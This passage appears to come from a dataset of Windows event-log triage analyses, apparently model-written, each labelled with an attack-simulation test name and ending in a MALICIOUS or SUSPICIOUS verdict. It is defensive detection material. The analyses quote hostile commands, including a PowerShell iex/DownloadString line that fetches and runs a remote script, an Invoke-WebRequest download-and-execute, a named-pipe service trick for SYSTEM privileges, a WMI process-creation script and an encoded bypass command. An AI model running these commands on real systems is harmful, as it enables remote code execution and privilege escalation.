2. **Review Remote Connections:** Examine additional logs around `DESKTOP-3HL5B2P` for unauthorized access attempts or breaches.
3. **Audit Log Integrity:** Ensure the integrity of the event logs to confirm there's no tampering. Implement audit mechanisms to monitor such utilities' usage.
4. **Network and Account Security:** Consider checking NTLM-based authentication across the network and strengthen any weak points in credential usage or storage.

- The logs contain activities that don't clearly indicate malicious intent but raise enough concern to warrant a deeper investigation to rule out unauthorized access or automation misuse."
LNK Payload Download,"Upon careful examination of the provided logs, here are the key findings, analysis, and the assessment of the situation:

### Analysis of Logs
1. **Time Manipulation Events:**
   - There are events in the Kernel-General and Security logs indicating the system time was altered by `svchost.exe`. This anomaly often hints at attempts to mislead event timestamps and potentially cover malicious activities.

2. **Suspicious PowerShell Activity:**
   - The Sysmon and PowerShell logs reveal PowerShell commands being executed with `Invoke-WebRequest` to download a file (`test10.lnk`) and execute it. Additionally, it includes terminating a process (`taskkill /IM a.exe /F`). This behavior is characteristic of malicious scripts attempting to download and execute payloads remotely.

3. **SVCHOST.EXE Execution:**
   - Multiple instances of `svchost.exe` execution under NT AUTHORITY\SYSTEM can be observed, but these are typically expected for legitimate Windows operations. However, together with the time manipulation, this becomes suspicious.

4. **Sequence of Process Executions:**
   - Series of executions by user `admin_test` of `whoami.exe`, `conhost.exe`, `wevtutil.exe` (responsible for event log manipulation), and `PowerShell.exe` followed by unusual command-line arguments indicate non-standard user behavior.

5. **Privilege Use:**
   - The security logs show elevated privileges (SeDebugPrivilege, SeTcbPrivilege, etc.) being assigned, which is customary for SYSTEM-related processes but, given in conjunction with other suspicious behaviors, could insinuate privilege escalation attempts or system manipulation.

6. **Network and Update Processes:**
   - While there are updates related to Edge, the primary concern lies in PowerShell activity and direct manipulation involving potential network interaction with external scripts.

### Assessment
The combination of manipulated system time events, downloads and execution of potentially malicious files via PowerShell, and attempts to terminate processes shows strong indicators of malicious activity. The use of legitimate Windows services and commands to download or execute other processes is a classic tactic employed in various types of attacks, such as malware infiltration or persistence mechanisms.

### Recommendations
Given the observations and analysis:
- **Isolate the Host:** As a precautionary measure, isolate the machine from the network to prevent potential spreading.
- **Digital Forensics:** Conduct a full forensic analysis on the machine to uncover hidden or additional indicators of compromise.
- **Review and Enhance EDR:** The current EDR settings allowed these actions to occur before detection, suggesting a review and update might be necessary to catch such activities early.
- **Patch and Update Tools:** Ensure all software, especially security and system patches, are up-to-date.

### Final Resolution
Given the findings, the conclusion must be:
- **MALICIOUS** - The logs display clear signs of malicious actions consistent with unauthorized access, file downloads, and attempted manipulations using elevated privileges. 

This assessment should be used to guide further investigation and remediation efforts."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments,"Based on the provided log entries, the following analysis can be made:

1. **Frequent Use of PowerShell:** There's a notable frequency of PowerShell executions within a short time period. PowerShell is a robust scripting language that can be used benignly, but is also commonly leveraged by attackers for malicious activities due to its powerful features and presence on most Windows systems.

2. **Encoded PowerShell Commands:** The logs show a PowerShell command with encoded arguments (`""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter ...}`). The usage of encoded commands in PowerShell can be a technique to obfuscate malicious activities. Attackers often use this method to hide malicious payloads or scripts in an encoded form, which can evade detection mechanisms focused on plain text analysis.

3. **Usage of `wevtutil.exe`:** This Windows utility is used to manage event logs and can be used in attacks to clear logs to cover tracks. There are repeated instances of its execution that might suggest an attempt to manipulate or delete event logs.

4. **High Integrity Level:** The integrity level for many of these processes is high, indicating they are running with elevated permissions. 'High' integrity processes could indicate potential privilege escalation, especially if conducted by unauthorized users or through suspicious processes.

5. **Multiple Console Host Executions (`conhost.exe`)**: The creation of multiple `conhost.exe` processes, associated with console applications, can be typical. However, in conjunction with encoded PowerShell command execution, it could be indicative of malicious scripting or console manipulation.

6. **Usage of `whoami.exe`:** The execution of this binary, which displays user information, may suggest reconnaissance activity aimed at understanding the logged-on user's privileges.

### Assessment:
There are several suspicious indicators present:
- Encoded PowerShell commands potentially used for obfuscation.
- Use of `wevtutil.exe` in succession, potentially to manipulate event logs.
- Elevated permissions for processes not typically requiring them.
- Unusual behavior such as frequent execution of `conhost.exe` and `whoami.exe`, possibly for unauthorized activities.

### Threats and Risks Identified:
- Potential for system compromise through obfuscated PowerShell activity.
- Possible log manipulation attempts to cover tracks of malicious activities.
- Risk of privilege escalation through malicious executions or scripting.

### Guidance on How to Proceed:
- Conduct a deep dive into the activities performed by these PowerShell processes. Attempt to decode any encoded commands to understand their actual purpose and intent.
- Investigate the reason for `wevtutil.exe` executions, verifying if it's tied to legitimate administrative tasks or potential log tampering.
- Review user account activity for `SERVER002\admin_test` to confirm if the behavior is expected or if credentials may be compromised.
- Monitor the system for additional suspicious behavior and apply restrictions to unnecessary execution of scripting interfaces if not required.

### Resolution:
- **SUSPICIOUS** - The activities in the logs warrant further investigation to determine if they are indicative of a compromise or if there are legitimate explanations for the behavior."
BlackCat pre-encryption cmds with Lateral Movement,"### Analysis of Windows Event Logs

Upon analyzing the provided logs, several activities warrant close attention due to their nature of execution and the associated command lines, which could pose potential security risks.

#### Observations and Concerns:

1. **Suspicious PowerShell Execution:**
   - Multiple entries of PowerShell executing commands such as WMIC, FSUTIL, and registry modification (`EventRecordID 18015` and `EventRecordID 18017`). These are often used in malicious scripts to gather system information and alter system configurations.
   - The commands involve setting symlink evaluation behaviors, modifying registry values (`MaxMpxCt` of LanmanServer), using WMIC to get UUID, and executing a script from an unusual location: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe`.
   - Such command sequences can be indicative of attempts to persist or facilitate lateral movement within a network.

2. **Unusual Process Execution:**
   - The `MicrosoftEdgeUpdate.exe` seems to be running with potential modifications or attempting operations not standard for its usual scope (`EventRecordID 17981`), potentially suggesting its use in a non-legitimate context.
   - Use of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test` in proximity to suspicious PowerShell activity raises potential concerns about log clearing or manipulation (seen in `EventRecordID 17986`, 17987).

3. **Repeated Credential Access Events:**
   - Event ID `5379` logs indicate multiple credential read attempts for `MicrosoftAccount:user=02txoixylodcstop`, which were all unsuccessful (Return Code: 3221226021). This repeated access without success can indicate unauthorized attempts to access credential stores.

4. **Privilege Escalation Indicators:**
   - Event ID `4672` indicates assignments of multiple high privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) under the SYSTEM account. While not uncommon, this paired with suspicious activities could point to privilege escalation activities.

5. **Execution of Unknown Script:**
   - The execution of a script located at `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe` is unusual and can be indicative of potentially malicious activity, especially given it was housed under a temporary directory, often used to stage malwares or scripts during execution.

#### Assessment:

- **SUSPICIOUS**: The combination of unauthorized PowerShell script execution, unusual process activity, and system modification commands are indicative of potential preparation for malware execution or unauthorized access/persistence mechanisms. Credential access logs further support potential reconnaissance or lateral movement behaviors.

#### Guidance and Next Steps:

1. **Immediate Investigation:**
   - Conduct a detailed investigation of the machine to determine the source and intent of the PowerShell scripts and macro recordings.
   - Check for indicators of compromise around the locations identified for script execution and modification (e.g., `%Temp%` directory).

2. **User and Machine Monitoring:**
   - Temporarily isolate the machine to prevent potential spread and further examine network logs for any additional signs of compromise or unusual communications.
   - Audit the user accounts, specifically `admin_test` and any accounts showing abnormal behaviors.

3. **Security Enhancements:**
   - Implement immediate PowerShell logging and script block logging for enhanced visibility and tracing.
   - Conduct an integrity check for the genuine Microsoft executables like `EdgeUpdate.exe` to ensure their legitimacy.

4. **Forensic Analysis:**
   - Further collection and preservation of log files for forensic analysis to evaluate the incident scope and any unnoticed impacts.

In conclusion, the suspicious activities observed necessitate immediate further investigation for definitive conclusions regarding the potential compromise of the system."
Cobalt Strike Lateral Movement (psexec_psh) pipe,"### Analysis:

Upon analyzing the provided Windows event logs, several key points of interest arise, notably around the activity of certain processes and their executed commands.

1. **Process Execution & Command-Line Arguments:**
   - **PowerShell (powershell.exe):** EventID 5 logs indicate that `powershell.exe` is executed by user ""SERVER002\admin_test"". While running PowerShell itself isn't inherently malicious, frequent invocations, especially using admin accounts, can be suspicious if associated with no clear administrative or maintenance tasks.
   - **Conhost (conhost.exe):** There are multiple instances of `conhost.exe`, which is a legitimate console window host. They seem to consistently follow benign system processes and thus do not raise immediate alarm.
   - **Command Prompt (cmd.exe) Execution:** The command line `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\build\namedpipes_executor.exe"" --pipe 2` is executed by user ""SERVER002\admin_test"". The use of named pipes and executables residing in temp directories could indicate a potential attempt to exploit inter-process communication, possibly for malicious purposes, though further investigation would be necessary to confirm intent.

2. **Usage of Unknown or Non-standard Executables:**
   - `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` show up repeatedly in the logs under EventID 1. These processes originated from a temporary files location which is typically unusual for executables, suggesting possible malicious or testing behavior. The presence of these executables and their invocation suggests unauthorized software or scripts are being run.

3. **Usage of System Utilities:**
   - **whoami.exe** and **wevtutil.exe**: `whoami.exe` is a legitimate utility used to display user information, but its use in a script or automated manner could be a step in reconnaissance activities. Similarly, `wevtutil.exe`, used for event log management, might be employed maliciously for clearing event logs as part of anti-forensic measures.

4. **Microsoft Edge Update Activity:**
   - The logs show several references to Microsoft Edge Update executables, such as `MicrosoftEdgeUpdate.exe`, which on the surface, appear to be conducting legitimate update operations. However, the consistent activity across different update components raises questions about whether these are genuinely benign updates or potentially leveraged binaries in a malicious activity context. Particularly notable is the edge update functionality associated with temporary directories.

5. **General Observations:**
   - The use of processes such as `taskhostw.exe`, while generally associated with legitimate tasks hosting for services, does not in itself explain its presence without additional context. The integrity level is high, reflecting the elevated privileges that could be utilized either legitimately or maliciously.
   - Network services such as `wbem\WmiPrvSE.exe` are interacting with the system frequently, which might reflect normal system operations or potentially the exploitation of WMI for persistent malware execution.

### Assessment and Resolution:

- **Resolution**: **SUSPICIOUS**

The logs contain several instances of processes and command-line executions that could indicate suspicious behavior. Particularly, the temporary directory executions, the frequent launch of PowerShell and cmd associated with potentially non-standard executables, suggest the need for further investigation. Additionally, to ascertain whether Edge update activities are benign or potentially covering illegitimate actions, a more in-depth review of network connections, file hashes, and correlation with known malicious IOCs should be conducted.

### Guidance:

1. **Immediate Actions:**
   - Conduct a thorough file integrity check and validate the executables found in the temporary directories against known legitimate applications.
   - Investigate the origins of the `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` to determine if they are part of a legitimate application or script.
   - Review any scheduled tasks and startup entries for unusual or unexpected scripts or executables.

2. **Further Steps:**
   - Perform network analysis to check for unusual outbound connections that might correlate with the suspicious activities.
   - Review account logs and system access policies to ensure consistent and approved usage of administrative credentials.
   - Conduct a full anti-malware scan to identify any potential infection not captured in the logs provided."
Office Generic Payload Download,"After reviewing the provided Windows event logs, I have identified several indicators of suspicious behavior which raise concerns about potential malicious activity:

1. **PowerShell Script Execution with External Resource Fetching:**
   - The Sysmon and PowerShell logs indicate the execution of PowerShell commands that reference external scripts hosted on Github (""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"") and attempt to download content and potentially execute it using `Invoke-Expression` (IEX). 
   - This behavior is indicative of a potential remote script execution, where malicious actors download and run scripts from external locations. This is a common technique used in various forms of malware and attack vectors.

2. **High Privilege Level Execution:**
   - Several logged activities show processes being executed with high integrity levels, indicating they are run with elevated privileges. This includes PowerShell commands and alterations that could potentially allow unauthorized access or control over system functions.

3. **Usage of Generic File Download Paths and Temporary Directories:**
   - The logs display activity that involves reading from paths such as ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file/data.002/src/test9-GenericfileDownload.txt,"" which is consistent with the use of temporary directories for storing files before execution. This is another red flag as it tends to mask activities from users and some security applications.

4. **Repetitive Execution Attempts:**
   - We observe repeated attempts to run the PowerShell commands and download scripts from the external URL, indicating persistent attempts to execute potentially harmful commands despite possible barriers.

Given these points:
- The actions taken by referenced scripts and the high privileges under which they are executed are indicative of a script-based attack attempt.
- Fetching external scripts and executing them using PowerShell IEX, particularly over unsecured mediums, is commonly associated with downloading and execution of malicious payloads.

**Assessment:**
- The combination of high-privilege PowerShell activity, commands that involve downloading and executing scripts from the web, and the use of obfuscated file paths strongly suggests that these logs indicate an attempt at malicious activity.

**Resolution: MALICIOUS**

**Guidance:**
- Immediate containment actions should be taken on this host, including isolating it from the network if possible.
- Perform a comprehensive malware scan and investigation into any changes made by these PowerShell scripts.
- Review user privileges and access logs to check for unauthorized logins or changes during the period these events were logged.
- Consider implementing stricter application control policies, such as limiting PowerShell execution rights and using execution policies to control script execution.
- If further evidence is obtained, report this to relevant authorities if external threat actors are suspected."
Create a Process using obfuscated Win32_Process,"**Analysis of Provided Windows Event Logs:**

### Suspicious or Anomalous Behavior:

1. **PowerShell Script Execution:**
   - The Windows PowerShell logs indicate an execution of a potentially malicious script: `powershell.exe & {$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(""Win32_Process"")) $NewClass = $Class.Derive(""Win32_file"") $NewClass.Put() Invoke-WmiMethod -Path Win32_file -Name create -ArgumentList notepad.exe}`.
   - This script leverages WMI (Windows Management Instrumentation) to create a process for `notepad.exe`. While `notepad.exe` itself isn't malicious, the method indicates an unusual technique often employed by attackers to execute or disguise malicious activities.

2. **Sysmon Logs:**
   - These logs show the creation and execution of various processes using the `admin_test` account on `Server002`, including the execution of `HOSTNAME.EXE`, `conhost.exe`, `whoami.exe`, and `notepad.exe`.
   - The `notepad.exe` process is shown to be spawned by `WmiPrvSE.exe`, which matches the PowerShell invocation of the WMI method to start a process. This is an unusual behavior that might indicate an attempt to evade standard detection mechanisms.
   
3. **Security and System Logs - Time Change Events:**
   - Security logs show changes in system time (EventID 4616) by the `svchost.exe` using LOCAL SERVICE credentials. While legitimate under certain system operations, it could potentially be a technique to cover up tracks or synchronize attacks with scheduled tasks.

### Indicators of Malicious Activity:

- The PowerShell command's usage of WMI to execute `notepad.exe` without apparent legitimate need suggests a level of obfuscation typical in malicious activity.
- The Sysmon logs' consistent presence of administrative account `admin_test` executing low-level Windows utilities (`wevtutil.exe`, `conhost.exe`) further supports potentially suspicious activities.

### Assessment:

Given the unusual PowerShell execution with WMI, the associated creation of processes including `notepad.exe`, and the administrative level account behavior, the logs show behaviors that are consistent with potentially malicious activity. These activities align with known tactics, techniques, and procedures (TTPs) used by adversaries to obfuscate actions and execute code under the radar.

### Resolution: MALICIOUS

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Isolate the machine (Server002) immediately from the network to prevent lateral movement.
   - Conduct a thorough investigation of network logs and endpoint data for further compromise indicators.

2. **Further Investigation:**
   - Perform a detailed forensic analysis on `Server002` to trace the origin and potential payloads or persistence mechanisms left by the attacker.
   - Review access logs for the account `admin_test` to determine if unauthorized access was gained.

3. **Mitigation:**
   - Apply necessary patches and security updates, particularly for PowerShell and WMI configurations.
   - Restrict WMI namespace access and implement PowerShell execution policies.

4. **Monitoring and Enhancement:**
   - Enhance monitoring via a Security Information and Event Management (SIEM) system for anomalous PowerShell and WMI activities.
   - Implement stricter Access Controls and Multi-Factor Authentication for administrative accounts like `admin_test`.

This resolution categorizes the situation as malicious, thereby warranting prompt response and thorough security measures to contain and mitigate any further risk."
Create a Process using WMI Query and an Encoded Command,"### Analysis of Windows Event Logs

#### Overview

The logs provided are from various Windows event channels and cover a range of activities. This analysis focuses on identifying suspicious, anomalous, or malicious activities that could indicate a compromise on the system, particularly the CEO's machine.

#### Detailed Analysis

1. **Process Creation and Execution:**
   - **Sysmon Event ID 1 (Process Creation):**
     - A sequence of processes involving `cmd.exe` invoking `powershell.exe` with the command line arguments `-exec bypass -e SQBuAHYAbw...`. This is a base64 encoded command commonly seen in obfuscated or potentially malicious scripts. 
     - The `bypass` execution policy is frequently used in attacks to avoid script execution restrictions enforced by PowerShell.

2. **Behavioral Anomalies:**
   - **Encoded PowerShell Command:**
     - The decoded content would need reviewing, but the presence of `-exec bypass` with encoded commands raises significant concern as it is indicative of an attempt to evade detection or execute scripts with elevated permissions.
     - This method is often part of a lateral movement, data exfiltration, or an advanced persistent threat (APT) tactic.

3. **Processes Linked to Common Attack Paths:**
   - `wevtutil.exe` and `conhost.exe` usage are common in legitimate operations but their concurrent appearance, especially linked in scripts, can flag for anomaly-based detection systems. It's worth noting though that their appearance alone is not indicative of an attack without further context.
   - The process tree involving `whoami.exe`, `hostname.exe`, and `cmd.exe` shows enumeration activity. Such activities might require further correlation to ensure they are not part of a larger automated script execution or reconnaissance efforts.

4. **Event Log Time Manipulation:**
   - The System and Security logs show multiple instances where the system time has been altered (`EventID 4616 & 1`). This could indicate an attempt to manipulate log timelines, a common tactic for attackers to evade detection and confuse timeline analysis during forensic investigations.

#### Assessment of Situation

- **SUSPICIOUS Activity Identified:**
  - The presence of encoded PowerShell commands executed via `cmd.exe`, coupled with time manipulation and the usage of native Windows utilities, aligns with tactics used to obfuscate malicious activity.
  - Currently, there isn't enough to definitively categorize the behavior as malicious without further context on the decoded PowerShell command or correlation with network and other endpoint logs, but the patterns are concerning.

#### Guidance on Proceeding

1. **Decode the PowerShell Command:**
   - Capture and decode the Base64 encoded PowerShell command to verify intent and contents.

2. **Review Other Logs:**
   - Investigate network traffic logs and any related file access logs for the user `SERVER002\admin_test` during the given timeframe for anomalies or data exfiltration attempts.

3. **Monitor for Persistence Mechanisms:**
   - Monitor for any newly introduced persistence mechanisms on the system (`registry keys`, `startup folders`, etc.).

4. **Time Synchronization Analysis:**
   - Assess the impact of system time modification and correlate with operational logs to establish any discrepancies or usage of this tactic in conjunction with other activities.

#### Resolution

**Resolution: SUSPICIOUS**

This activity does not conclusively indicate an active breach but possesses characteristics that warrant further serious investigation to clarify the nature of the PowerShell execution and potential abuse of system utilities."
WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,"Based on the provided log entries, there are several indicators of potentially malicious activity that merit concern. Here's a detailed analysis that leads to these conclusions:

1. **PowerShell Activity**: 
   - There are several PowerShell events indicating the execution of scripts downloaded from a remote source, specifically:
     ```
     powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}
     ```
   - This behavior is suspicious as it signifies potential remote code execution through PowerShell, which is a common technique used in attacks.

2. **Service Creation and Execution**:
   - There's evidence of the creation and start of a service (`svcHighPriv`) with a command:
     ```
     New-Service -Name svcHighPriv -BinaryPathName 'C:\\windows\\system32\\cmd.exe /C echo Uuup! > \\\\.\\pipe\\HighPriv'
     ```
   - This indicates an attempt to execute a command that is likely related to privilege escalation or system exploitation by using named pipes.

3. **Use of High Privilege Tokens**:
   - Event ID 4672 indicates the assignment of a series of high privileges (`SeDebugPrivilege`, `SeTcbPrivilege`, etc.) to a session, potentially to allow for significant alterations of system processes or configurations.
   - The combination of high privilege assignment and subsequent suspicious service activities accentuates the risk level.

4. **Named Pipe Manipulation**:
   - The logs show activities linked to named pipes, which are being leveraged possibly for inter-process communication that circumvents normal security controls.

5. **Event Logs**:
   - The consistent creation and deletion of system services, combined with the suspicious PowerShell script execution, suggest an orchestrated effort likely related to an exploitation attempt.

6. **Network and System Integrity**:
   - No specific network anomalies or brute force attempts are detected in the logs; however, the unauthorized creation of services and execution of remote scripts are sufficient to indicate a breach.

**Assessment**

Based on the given log entries, there is evidence of potentially malicious activity, particularly focused around the unauthorized execution of scripts and privilege escalation attempts through Windows services and PowerShell. The exploitation techniques used suggest a sophisticated attempt to gain and maintain elevated privileges on the system.

**MALICIOUS** - The logs clearly contain malicious activities characterized by suspicious PowerShell executions, unauthorized service manipulations, and high privilege usage that are typical indicators of compromise.

**Guidance on How to Proceed**

1. **Immediate Containment**:
   - Identify and isolate any affected systems to prevent further unauthorized access or damage.
   - Terminate suspicious processes and services identified in the logs.

2. **Investigation and Remediation**:
   - Conduct a detailed forensic analysis of the affected host to determine the extent of compromise and the attack vector.
   - Review and update security policies, specifically restricting the use of PowerShell.
   - Implement stricter monitoring and alerting on activities involving elevated privileges and service creation.

3. **Preventive Measures**:
   - Patch all known vulnerabilities and ensure all systems are updated.
   - Educate users on safe security practices, particularly around email attachments and web surfing.
   - Deploy or enhance existing Endpoint Detection and Response (EDR) solutions to swiftly detect and respond to suspicious activities."
WMI Reconnaissance Software,"Based on the analysis of the provided Windows event logs, the following observations can be made:

### Suspicious or Anomalous Behavior

1. **Time Changes:**
   - There are multiple events from the Security and System logs indicating that the system time was altered. Specifically, these events (`EventID: 4616` and `EventID: 1` from the System logs) show that the `svchost.exe` process was involved in changing time, setting it backwards, which is unusual and could be indicative of attempts to manipulate timestamps for anti-forensic purposes.

2. **Frequent Execution of Administrative Utilities:**
   - There are several Sysmon events showing frequent execution of administrative commands and utilities (`wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `wmic.exe`) by the `admin_test` user.
   - A command-line execution pattern appears where the execution occurs in short intervals, which might indicate automation or scripting.
   - Specifically, the execution of `wmic` via a cmd command (`\""cmd.exe\"" /c wmic qfe get description,installedOn /format:csv`) could indicate a script or command is collecting installed update information.

3. **Command Execution with High Integrity Levels:**
   - Commands such as `whoami.exe` and `wmic.exe` are executed with high integrity level, suggesting they are being run with elevated privileges. This is a typical behavior for administrative actions, but if out of ordinary for the user `admin_test`, it could be considered suspicious.

### Assessment of Malicious Activity or Compromise

- **Time Manipulation:** 
  The change in system time is a significant red flag. Such changes can facilitate bypassing logging features or circumventing scheduled security checks. It is crucial to determine if this was a legitimate time adjustment or potentially malicious.

- **Use of System Utilities:**
  The use of system utilities in quick succession might suggest reconnaissance activities by an attacker leveraging legitimate Windows utilities. This behavior aligns with tactics used to gather system information without introducing third-party tools that might raise alerts.

### Threats or Risks Identified

- **Potential Insider or Credential Compromise:**
  Given that the actions are associated with a user `admin_test`, there is a potential risk of account compromise or insider actions using administrative credentials.
  
- **System Integrity Concerns:**
  The unexplained time changes and command executions raise concerns about the machine's integrity and potential manipulation of system logs or configurations.

### Guidance on How to Proceed

- **Verification and Interviews:**
  - Confirm whether the time changes were scheduled or authorized by legitimate IT operations. Interview the user associated with the `admin_test` account to verify legitimacy.
  
- **Security Audit and Monitoring:**
  - Conduct a detailed security audit, including checking for any unauthorized access or changes to sensitive files or configurations.
  - Increase monitoring on the machine for further unusual activity and consider temporary restriction of the `admin_test` account to prevent further potential damage.

- **Forensic Analysis:**
  - Perform a forensic analysis to retrieve detailed information on the time changes and verify if they align with unauthorized access patterns.
  - Check surrounding logs for potential network connections or file transfer activities that might indicate data exfiltration.

### Final Resolution

**SUSPICIOUS** - The activity within the logs contains elements that do not appear benign and require further investigation to determine the nature and intent, as well as to ensure the system and network security."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations,"Based on the analysis of the provided logs, here are the observations:

### Suspicious and Anomalous Behavior:
1. **Excessive Use of `wevtutil.exe` and `conhost.exe`:** 
   - `wevtutil.exe` is a legitimate Windows command-line utility used for managing Windows Event Logs. It appears multiple times (`ProcessId`: 5044, 5780, 5608, 5852, 5844) with no clear reasoning or operational context for these operations in the logs. This could be indicative of an attempt to clear or manipulate event logs, often seen in post-exploitation activities.
   - `conhost.exe` (Console Window Host) is also executed multiple times with no apparent user-initiated command lines, raising questions about its necessity in these sequences.

2. **PowerShell Execution:**
   - Multiple entries show the execution of `powershell.exe` with potentially encoded commands (`EventID`: 5, `ProcessId`: 6520, 1532). PowerShell is widely used for legitimate administrative tasks but is often abused by attackers to execute malicious scripts, especially through obfuscated commands.

3. **Use of `whoami.exe` and `hostname.exe`:**
   - The execution of `whoami.exe` and `hostname.exe` (used to display username and computer name, respectively) is not inherently suspicious, but if executed without clear intent, it might be part of a script to gather system information post-compromise.

### Indicators of Malicious Activity:
- **Encoded Commands in PowerShell:** 
  - The PowerShell command includes encoded command parameter variations, which is a common technique used to obfuscate malicious scripts from detection. This requires further decoding and analysis to understand the purpose of these commands.

- **Use of `wsmprovhost.exe`:**
  - Multiple parent processes are noted as `wsmprovhost.exe`, which is related to Windows Remote Management (WinRM). Unusual or unauthorized use of `wsmprovhost.exe` might suggest lateral movement or an unauthorized remote session.

### Assessment:
- **SUSPICIOUS:** 
  - The excessive and simultaneous execution of system utilities (`wevtutil`, `conhost`, `PowerShell with encoded commands) without a benign explanation raises significant concern. While these utilities are legitimate, their usage here seems orchestrated and suspicious, possibly related to a script with malicious intent, such as event log tampering or reconnaissance activities.

### Threats and Risks:
- Potentially unauthorized use of PowerShell with encoded commands could lead to undetected execution of malicious scripts.
- Possible tampering with event logs using `wevtutil.exe`.
- Signs of reconnaissance activities by gathering system information and possibly environment mapping.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Decode and analyze the PowerShell commands to determine their intent.
   - Check for any unauthorized or unknown scripts/tools on the system.
   - Review other systems in the network to ensure this is not part of a larger compromise.

2. **Monitoring and Review:**
   - Increase monitoring for PowerShell and utility tool usage across other critical systems.
   - Check for successful or attempted lateral movement using `wsmprovhost.exe`.

3. **Remediation and Forensics:**
   - Conduct a deep dive forensic investigation to backtrack how any potential malicious script or user gained access.
   - Evaluate patch levels and the security posture of the system, ensuring all critical updates and security configurations are applied.

4. **User Awareness and Training:**
   - Reinforce user training on identifying phishing attacks or social engineering tactics that might have led to this kind of breach.

Based on these observations and recommendations, the activity logged here is labeled as **SUSPICIOUS** and warrants a detailed and urgent investigation to rule out or confirm malicious activity."
OSTap Style Macro Execution,"### Detailed Analysis of Logs:

The logs provided contain entries from the Application, Sysmon, Windows PowerShell, and Security event logs. After examining these logs, several activities stand out as possibly malicious:

1. **Use of PowerShell Download & Execution**:
   - A PowerShell command is being used to download and execute a script from an external URL (https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1). The PowerShell command line suggests it is bypassing traditional script execution policies and could potentially be loading a malicious script into memory using `Invoke-Expression (IEX)`.
   - **Indicator**: Powershell is often used legitimately, but the combination of `IEX` from an external URL is a common red flag for malicious activity.

2. **Creation and Execution of Obfuscated Script**:
   - The PowerShell script writes to C:\Users\Public\art.jse and executes a command with cscript. This behavior suggests an attempt to execute or utilize scripts in a potentially hidden manner, possibly to evade detection.
   - **Indicator**: Generation and execution of scripts from temporary folders can be indicative of malicious activity, especially when combined with PowerShell.

3. **Process Execution Patterns**:
   - Multiple instances involving the execution of processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` are noted. Although these are legitimate executables, the frequent and rapid execution of these tools might indicate attempts at enumeration or manipulation.
   - Particularly `wevtutil.exe` is used, which could indicate log manipulation attempts.
   - **Indicator**: High-frequency launch of these executables, especially orchestrated by a PowerShell script, suggest command and control activities or a script running automated tasks.

4. **High Privilege Use and Service Manipulation**:
   - The `SeDebugPrivilege` and similar privileges could point towards a service or administrative manipulation attempt.
   - Commands like `""sc.exe start wuauserv""` indicate potential abuse of admin commands to start or manipulate Windows services which can be malicious if unexpected.
   - **Indicator**: High privilege commands and system-level services manipulation are classic indicators of privilege escalation techniques.

### Assessment:

Based on the analysis, the use of PowerShell to fetch and execute an unknown remote script, the rapid creation and execution of potentially obfuscated or scripted commands, and usage patterns indicative of privilege escalation or persistence mechanisms, these actions collectively represent a high risk of compromise.

### Resolution:

**MALICIOUS** - The observed behavior in the logs distinctly shows attempts to execute and possibly conceal malicious actions via downloading external scripts using PowerShell and manipulating system processes and logs. Immediate action is advised.

### Guidance on How to Proceed:

1. **Isolation**: Immediately isolate the affected machine to prevent further potential leakage or lateral movement in the network.
2. **Forensic Assessment**: Conduct a deeper forensic analysis on the machine to uncover the full extent of the breach. This includes retrieving the script in question and performing hash analysis and behavioral analysis on it.
3. **Address Vulnerability and Patch**: Scan for known vulnerabilities, ensure systems are up-to-date, and any unnecessary services are disabled.
4. **Improved Monitoring**: Implement strict monitoring of PowerShell usage across the network with appropriate alerts for such behavior.
5. **Detection and Response**: Enhance detection capabilities with a focus on early detection of similar behavior, focusing on lateral movement and privilege escalation attempts.
6. **User Awareness and Training**: Conduct training programs to raise awareness about the potential outcomes due to script executions and phishing attempts that could lead to unauthorized PowerShell executions."
Malicious Execution from Mounted ISO Image,"Upon analyzing the provided Windows event logs, we can summarize the findings as follows:

### Analysis of Logs

1. **Suspicious PowerShell Activity:**
   - In the Windows PowerShell log, there are multiple instances of a PowerShell command attempting to download an ISO file (`qbot-test.iso`) from a GitHub URL. The command script includes:
     - Using `iwr` (Invoke-WebRequest) to download a file.
     - Mounting a disk image.
     - Navigating to the mounted path and executing `calc.exe.lnk`.

   This behavior indicates an attempt to download and run an external (possibly malicious) script or program on the system. The use of PowerShell to invoke web requests and manipulate disk images is a common tactic used in malicious attacks to evade detection and execute unauthorized code.

2. **Process Execution Tracing:**
   - The Sysmon and other logs confirm that the suspicious PowerShell commands were executed by a process with administrative privileges (Integrity Level: High). The execution of `calc.exe` from an unusual location (`E:\`) suggests that the downloaded file was executed as intended.
   - Checking processes like `whoami.exe`, `conhost.exe`, `cmd.exe`, and others reveal routine activities, except for the context where `cmd.exe` executed `calc.exe`.

3. **EDR Alert Correlation:**
   - The EDR alert you're investigating likely flagged this unusual PowerShell and subsequent process activity, given the unusual command line usage and possible file execution from a newly mounted image.

4. **Other Logged Events:**
   - The Application, System, and Security logs do not show any other direct signs of compromise such as privilege escalation, new account creation, or unusual network activities that link directly to this suspicious behavior.

### Assessment

The significant red flag here is the PowerShell command that downloads and mounts an ISO, coupled with the execution of a potentially malicious file (`calc.exe.lnk`). While the presence of executed standard Windows binaries like `whoami.exe` or `conhost.exe` is normal, their association with malicious downloads and attempts to execute external payloads is concerning.

### Resolution

- **MALICIOUS**: The logs indicate clear signs of a download and execution of potentially malicious content through PowerShell commands. This activity aligns with known malicious tactics involving the execution of unauthorized software on a host.

### Recommendations

1. **Immediate Response:**
